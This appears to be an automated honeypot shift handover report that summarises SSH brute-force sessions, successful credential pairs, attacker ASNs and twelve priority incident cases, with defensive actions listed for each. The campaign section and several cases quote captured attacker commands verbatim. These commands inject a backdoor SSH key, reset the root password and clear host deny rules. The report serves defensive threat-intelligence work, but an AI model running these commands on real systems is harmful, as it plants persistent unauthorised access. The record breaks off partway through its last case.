# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T22:27:23Z |
| **Shift Time** | 22:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **92** |
| Confirmed Threats | **59** |
| False Positives Filtered | **33** (35.9%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **17** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **80** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **33** |
| Unique Credential Pairs | **28** |
| Unique Usernames | **14** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `admin` | 4 |
| `345gs5662d34` | 3 |
| `ubnt` | 2 |
| `Unknown` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `root2012` | 2 |
| `qazwsx12` | 1 |
| ` ` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `root2012` | 2 |
| `root` | `qazwsx12` | 1 |
| `root` | ` ` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx12` | `14.225.253.26` | 2026-03-28T20:37:10 |
| `root` | `3245gs5662d34` | `14.225.253.26` | 2026-03-28T20:37:13 |
| `root` | ` ` | `47.243.227.167` | 2026-03-28T20:38:16 |
| `root` | `admin-123` | `101.91.170.71` | 2026-03-28T21:07:29 |
| `root` | `root2012` | `201.209.117.132` | 2026-03-28T21:22:33 |
| `root` | `root2012` | `24.142.170.231` | 2026-03-28T21:22:41 |
| `root` | `noise` | `95.231.249.182` | 2026-03-28T21:24:39 |
| `root` | `3245gs5662d34` | `95.231.249.182` | 2026-03-28T21:24:42 |
| `root` | `enkj.1qazxdr5` | `101.91.170.71` | 2026-03-28T21:35:22 |
| `root` | `root@666` | `101.91.170.71` | 2026-03-28T21:43:04 |
| `root` | `Pass_Word` | `101.32.128.193` | 2026-03-28T22:19:40 |
| `root` | `3245gs5662d34` | `101.32.128.193` | 2026-03-28T22:19:42 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:pDlVmmVKhiaY"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.91.170.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.225.253.26`, `101.32.128.193`, `95.231.249.182`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **27** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 3 | MEDIUM |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9f33367184bd

| Field | Detail |
|---|---|
| **Source IP** | `14.225.253[.]26` |
| **First Seen** | 2026-03-28 20:37 |
| **Last Seen** | 2026-03-28 20:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 20:37:10` | `cowrie.session.connect` |
| `2026-03-28 20:37:10` | `cowrie.client.version` |
| `2026-03-28 20:37:10` | `cowrie.client.kex` |
| `2026-03-28 20:37:10` | `cowrie.login.success` |
| `2026-03-28 20:37:10` | `cowrie.session.params` |
| `2026-03-28 20:37:10` | `cowrie.command.input` |
| `2026-03-28 20:37:10` | `cowrie.command.failed` |
| `2026-03-28 20:37:10` | `cowrie.log.closed` |
| `2026-03-28 20:37:11` | `cowrie.session.params` |
| `2026-03-28 20:37:11` | `cowrie.command.input` |
| `2026-03-28 20:37:11` | `cowrie.session.file_download` |
| `2026-03-28 20:37:11` | `cowrie.log.closed` |
| `2026-03-28 20:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.253[.]26` to AbuseIPDB if not already reported
- [ ] Block `14.225.253[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15dead1f2c51

| Field | Detail |
|---|---|
| **Source IP** | `14.225.253[.]26` |
| **First Seen** | 2026-03-28 20:37 |
| **Last Seen** | 2026-03-28 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 20:37:13` | `cowrie.session.connect` |
| `2026-03-28 20:37:13` | `cowrie.client.version` |
| `2026-03-28 20:37:13` | `cowrie.client.kex` |
| `2026-03-28 20:37:13` | `cowrie.login.success` |
| `2026-03-28 20:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.253[.]26` to AbuseIPDB if not already reported
- [ ] Block `14.225.253[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6873fc170377

| Field | Detail |
|---|---|
| **Source IP** | `47.243.227[.]167` |
| **First Seen** | 2026-03-28 20:38 |
| **Last Seen** | 2026-03-28 20:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 20:38:16` | `cowrie.session.connect` |
| `2026-03-28 20:38:16` | `cowrie.client.version` |
| `2026-03-28 20:38:16` | `cowrie.client.kex` |
| `2026-03-28 20:38:16` | `cowrie.login.success` |
| `2026-03-28 20:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.243.227[.]167` to AbuseIPDB if not already reported
- [ ] Block `47.243.227[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ce0051737a4

| Field | Detail |
|---|---|
| **Source IP** | `101.91.170[.]71` |
| **First Seen** | 2026-03-28 21:07 |
| **Last Seen** | 2026-03-28 21:07 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pDlVmmVKhiaY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 21:07:28` | `cowrie.session.connect` |
| `2026-03-28 21:07:28` | `cowrie.client.version` |
| `2026-03-28 21:07:28` | `cowrie.client.kex` |
| `2026-03-28 21:07:29` | `cowrie.login.success` |
| `2026-03-28 21:07:29` | `cowrie.session.params` |
| `2026-03-28 21:07:29` | `cowrie.command.input` |
| `2026-03-28 21:07:29` | `cowrie.command.failed` |
| `2026-03-28 21:07:29` | `cowrie.log.closed` |
| `2026-03-28 21:07:30` | `cowrie.session.params` |
| `2026-03-28 21:07:30` | `cowrie.command.input` |
| `2026-03-28 21:07:30` | `cowrie.session.file_download` |
| `2026-03-28 21:07:30` | `cowrie.log.closed` |
| `2026-03-28 21:07:43` | `cowrie.session.params` |
| `2026-03-28 21:07:43` | `cowrie.command.input` |
| `2026-03-28 21:07:43` | `cowrie.log.closed` |
| `2026-03-28 21:07:43` | `cowrie.session.params` |
| `2026-03-28 21:07:43` | `cowrie.command.input` |
| `2026-03-28 21:07:44` | `cowrie.log.closed` |
| `2026-03-28 21:07:44` | `cowrie.session.params` |
| `2026-03-28 21:07:44` | `cowrie.command.input` |
| `2026-03-28 21:07:44` | `cowrie.session.file_download` |
| `2026-03-28 21:07:44` | `cowrie.log.closed` |
| `2026-03-28 21:07:44` | `cowrie.session.params` |
| `2026-03-28 21:07:44` | `cowrie.command.input` |
| `2026-03-28 21:07:45` | `cowrie.log.closed` |
| `2026-03-28 21:07:45` | `cowrie.session.params` |
| `2026-03-28 21:07:45` | `cowrie.command.input` |
| `2026-03-28 21:07:45` | `cowrie.log.closed` |
| `2026-03-28 21:07:45` | `cowrie.session.params` |
| `2026-03-28 21:07:45` | `cowrie.command.input` |
| `2026-03-28 21:07:45` | `cowrie.command.input` |
| `2026-03-28 21:07:45` | `cowrie.log.closed` |
| `2026-03-28 21:07:46` | `cowrie.session.params` |
| `2026-03-28 21:07:46` | `cowrie.command.input` |
| `2026-03-28 21:07:46` | `cowrie.log.closed` |
| `2026-03-28 21:07:46` | `cowrie.session.params` |
| `2026-03-28 21:07:46` | `cowrie.command.input` |
| `2026-03-28 21:07:46` | `cowrie.log.closed` |
| `2026-03-28 21:07:47` | `cowrie.session.params` |
| `2026-03-28 21:07:47` | `cowrie.command.input` |
| `2026-03-28 21:07:47` | `cowrie.log.closed` |
| `2026-03-28 21:07:47` | `cowrie.session.params` |
| `2026-03-28 21:07:47` | `cowrie.command.input` |
| `2026-03-28 21:07:47` | `cowrie.log.closed` |
| `2026-03-28 21:07:48` | `cowrie.session.params` |
| `2026-03-28 21:07:48` | `cowrie.command.input` |
| `2026-03-28 21:07:48` | `cowrie.log.closed` |
| `2026-03-28 21:07:48` | `cowrie.session.params` |
| `2026-03-28 21:07:48` | `cowrie.command.input` |
| `2026-03-28 21:07:48` | `cowrie.log.closed` |
| `2026-03-28 21:07:48` | `cowrie.session.params` |
| `2026-03-28 21:07:48` | `cowrie.command.input` |
| `2026-03-28 21:07:49` | `cowrie.log.closed` |
| `2026-03-28 21:07:49` | `cowrie.session.params` |
| `2026-03-28 21:07:49` | `cowrie.command.input` |
| `2026-03-28 21:07:49` | `cowrie.log.closed` |
| `2026-03-28 21:07:49` | `cowrie.session.params` |
| `2026-03-28 21:07:49` | `cowrie.command.input` |
| `2026-03-28 21:07:50` | `cowrie.log.closed` |
| `2026-03-28 21:07:50` | `cowrie.session.params` |
| `2026-03-28 21:07:50` | `cowrie.command.input` |
| `2026-03-28 21:07:50` | `cowrie.log.closed` |
| `2026-03-28 21:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.91.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `101.91.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1fff5042ce5

| Field | Detail |
|---|---|
| **Source IP** | `201.209.117[.]132` |
| **First Seen** | 2026-03-28 21:22 |
| **Last Seen** | 2026-03-28 21:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 21:22:30` | `cowrie.session.connect` |
| `2026-03-28 21:22:31` | `cowrie.client.version` |
| `2026-03-28 21:22:31` | `cowrie.client.kex` |
| `2026-03-28 21:22:33` | `cowrie.login.success` |
| `2026-03-28 21:22:34` | `cowrie.direct-tcpip.request` |
| `2026-03-28 21:22:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.209.117[.]132` to AbuseIPDB if not already reported
- [ ] Block `201.209.117[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931bcf514124

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-03-28 21:22 |
| **Last Seen** | 2026-03-28 21:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 21:22:39` | `cowrie.session.connect` |
| `2026-03-28 21:22:39` | `cowrie.client.version` |
| `2026-03-28 21:22:39` | `cowrie.client.kex` |
| `2026-03-28 21:22:41` | `cowrie.login.success` |
| `2026-03-28 21:22:41` | `cowrie.direct-tcpip.request` |
| `2026-03-28 21:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2640e336e7

| Field | Detail |
|---|---|
| **Source IP** | `95.231.249[.]182` |
| **First Seen** | 2026-03-28 21:24 |
| **Last Seen** | 2026-03-28 21:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 21:24:38` | `cowrie.session.connect` |
| `2026-03-28 21:24:38` | `cowrie.client.version` |
| `2026-03-28 21:24:38` | `cowrie.client.kex` |
| `2026-03-28 21:24:39` | `cowrie.login.success` |
| `2026-03-28 21:24:39` | `cowrie.session.params` |
| `2026-03-28 21:24:39` | `cowrie.command.input` |
| `2026-03-28 21:24:39` | `cowrie.command.failed` |
| `2026-03-28 21:24:39` | `cowrie.log.closed` |
| `2026-03-28 21:24:39` | `cowrie.session.params` |
| `2026-03-28 21:24:39` | `cowrie.command.input` |
| `2026-03-28 21:24:39` | `cowrie.session.file_download` |
| `2026-03-28 21:24:39` | `cowrie.log.closed` |
| `2026-03-28 21:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.231.249[.]182` to AbuseIPDB if not already reported
- [ ] Block `95.231.249[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24bd039ff20f

| Field | Detail |
|---|---|
| **Source IP** | `95.231.249[.]182` |
| **First Seen** | 2026-03-28 21:24 |
| **Last Seen** | 2026-03-28 21:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 21:24:42` | `cowrie.session.connect` |
| `2026-03-28 21:24:42` | `cowrie.client.version` |
| `2026-03-28 21:24:42` | `cowrie.client.kex` |
| `2026-03-28 21:24:42` | `cowrie.login.success` |
| `2026-03-28 21:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.231.249[.]182` to AbuseIPDB if not already reported
- [ ] Block `95.231.249[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd125e325c5b

| Field | Detail |
|---|---|
| **Source IP** | `101.91.170[.]71` |
| **First Seen** | 2026-03-28 21:35 |
| **Last Seen** | 2026-03-28 21:35 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:PCmLg1vuU1gd"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 21:35:22` | `cowrie.session.connect` |
| `2026-03-28 21:35:22` | `cowrie.client.version` |
| `2026-03-28 21:35:22` | `cowrie.client.kex` |
| `2026-03-28 21:35:22` | `cowrie.login.success` |
| `2026-03-28 21:35:23` | `cowrie.session.params` |
| `2026-03-28 21:35:23` | `cowrie.command.input` |
| `2026-03-28 21:35:23` | `cowrie.command.failed` |
| `2026-03-28 21:35:23` | `cowrie.log.closed` |
| `2026-03-28 21:35:23` | `cowrie.session.params` |
| `2026-03-28 21:35:23` | `cowrie.command.input` |
| `2026-03-28 21:35:23` | `cowrie.session.file_download` |
| `2026-03-28 21:35:23` | `cowrie.log.closed` |
| `2026-03-28 21:35:35` | `cowrie.session.params` |
| `2026-03-28 21:35:35` | `cowrie.command.input` |
| `2026-03-28 21:35:36` | `cowrie.log.closed` |
| `2026-03-28 21:35:36` | `cowrie.session.params` |
| `2026-03-28 21:35:36` | `cowrie.command.input` |
| `2026-03-28 21:35:36` | `cowrie.log.closed` |
| `2026-03-28 21:35:36` | `cowrie.session.params` |
| `2026-03-28 21:35:36` | `cowrie.command.input` |
| `2026-03-28 21:35:36` | `cowrie.session.file_download` |
| `2026-03-28 21:35:36` | `cowrie.log.closed` |
| `2026-03-28 21:35:37` | `cowrie.session.params` |
| `2026-03-28 21:35:37` | `cowrie.command.input` |
| `2026-03-28 21:35:37` | `cowrie.log.closed` |
| `2026-03-28 21:35:37` | `cowrie.session.params` |
| `2026-03-28 21:35:37` | `cowrie.command.input` |
| `2026-03-28 21:35:37` | `cowrie.log.closed` |
| `2026-03-28 21:35:38` | `cowrie.session.params` |
| `2026-03-28 21:35:38` | `cowrie.command.input` |
| `2026-03-28 21:35:38` | `cowrie.command.input` |
| `2026-03-28 21:35:38` | `cowrie.log.closed` |
| `2026-03-28 21:35:38` | `cowrie.session.params` |
| `2026-03-28 21:35:38` | `cowrie.command.input` |
| `2026-03-28 21:35:38` | `cowrie.log.closed` |
| `2026-03-28 21:35:39` | `cowrie.session.params` |
| `2026-03-28 21:35:39` | `cowrie.command.input` |
| `2026-03-28 21:35:39` | `cowrie.log.closed` |
| `2026-03-28 21:35:39` | `cowrie.session.params` |
| `2026-03-28 21:35:39` | `cowrie.command.input` |
| `2026-03-28 21:35:39` | `cowrie.log.closed` |
| `2026-03-28 21:35:40` | `cowrie.session.params` |
| `2026-03-28 21:35:40` | `cowrie.command.input` |
| `2026-03-28 21:35:40` | `cowrie.log.closed` |
| `2026-03-28 21:35:40` | `cowrie.session.params` |
| `2026-03-28 21:35:40` | `cowrie.command.input` |
| `2026-03-28 21:35:40` | `cowrie.log.closed` |
| `2026-03-28 21:35:41` | `cowrie.session.params` |
| `2026-03-28 21:35:41` | `cowrie.command.input` |
| `2026-03-28 21:35:41` | `cowrie.log.closed` |
| `2026-03-28 21:35:41` | `cowrie.session.params` |
| `2026-03-28 21:35:41` | `cowrie.command.input` |
| `2026-03-28 21:35:41` | `cowrie.log.closed` |
| `2026-03-28 21:35:42` | `cowrie.session.params` |
| `2026-03-28 21:35:42` | `cowrie.command.input` |
| `2026-03-28 21:35:42` | `cowrie.log.closed` |
| `2026-03-28 21:35:42` | `cowrie.session.params` |
| `2026-03-28 21:35:42` | `cowrie.command.input` |
| `2026-03-28 21:35:42` | `cowrie.log.closed` |
| `2026-03-28 21:35:42` | `cowrie.session.params` |
| `2026-03-28 21:35:42` | `cowrie.command.input` |
| `2026-03-28 21:35:43` | `cowrie.log.closed` |
| `2026-03-28 21:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.91.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `101.91.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d876274199d3

| Field | Detail |
|---|---|
| **Source IP** | `101.91.170[.]71` |
| **First Seen** | 2026-03-28 21:43 |
| **Last Seen** | 2026-03-28 21:43 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
